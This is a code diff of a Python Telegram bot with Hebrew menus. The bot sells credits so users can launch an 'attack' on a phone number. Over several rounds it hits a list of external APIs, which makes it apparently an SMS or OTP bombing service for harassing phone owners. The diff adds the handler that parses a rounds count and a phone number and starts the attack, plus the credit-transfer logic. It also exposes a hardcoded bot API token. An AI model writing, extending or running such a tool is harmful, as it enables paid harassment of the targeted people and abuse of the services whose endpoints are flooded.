@@ -7,7 +7,7 @@ import os
 import uuid
 from datetime import datetime, timedelta
 
-# --- שרת Flask לשמירה על הבוט בחיים ---
+# --- שרת Flask ---
 app = Flask('')
 @app.route('/')
 def home(): return "<h1>Turbo Bot 11 Sites - Ready</h1>"
@@ -17,9 +17,8 @@ def keep_alive():
     t.start()
 
 # --- הגדרות בוט ומנהל ---
-# הטוקן החדש שסיפקת
 API_TOKEN = '8620606926:AAGMfePP7qWs84njZziDh7fU_n0LBK411Xg' 
-ADMIN_ID = 7265913946  # צור דביר
+ADMIN_ID = 7265913946  
 bot = telebot.TeleBot(API_TOKEN)
 
 user_data = {} 
@@ -64,11 +63,8 @@ def attack(m, target, rounds):
                 if res.status_code in [200, 201, 204]: success_count += 1
             except: pass
         
-        # הודעה פשוטה למניעת שגיאות עיצוב בטלגרם
         bot.send_message(m.chat.id, f"⚡️ Round {r+1} | Success: {success_count}/{len(apis)} | Bal: {user['credits']}")
-        
-        if r < int(rounds) - 1:
-            time.sleep(0.1) # דיליי טורבו
+        if r < int(rounds) - 1: time.sleep(0.1)
 
     bot.send_message(m.chat.id, "🏁 Done!")
 
@@ -81,8 +77,8 @@ def start(m):
         "👑 מנכ\"ל: @Tzur_Dvir\n"
         "💳 מחירון: 100 קרדיטים ב-10₪\n\n"
         "💰 /me - יתרה ו-ID\n"
-        "🎁 /daily - מתנה יומית (10)\n"
-        "💸 /send [ID] [כמות] - העברה לחבר\n\n"
+        "🎁 /daily - מתנה יומית\n"
+        "💸 /send [ID] [כמות] - העברה\n\n"
         "🚀 הפעלה: [סבבים] [טלפון]\n"
         "דוגמה: 3 0521234567"
     )
@@ -119,4 +115,26 @@ def send_credits(m):
     u = get_user(m.from_user.id)
     try:
         p = m.text.split()
-        tid, amt = int(p[1]), int(p
+        tid, amt = int(p[1]), int(p[2])
+        if amt <= 0 or u['credits'] < amt: return
+        t_user = get_user(tid)
+        u['credits'] -= amt
+        t_user['credits'] += amt
+        bot.reply_to(m, f"✅ Sent {amt} to {tid}")
+    except: pass
+
+@bot.message_handler(func=lambda m: True)
+def handle(m):
+    try:
+        p = m.text.split()
+        if len(p) == 2 and p[0].isdigit():
+            attack(m, p[1], p[0])
+    except: pass
+
+if __name__ == "__main__":
+    keep_alive()
+    while True:
+        try:
+            bot.polling(none_stop=True, interval=0, timeout=20, drop_pending_updates=True)
+        except Exception:
+            time.sleep(5)
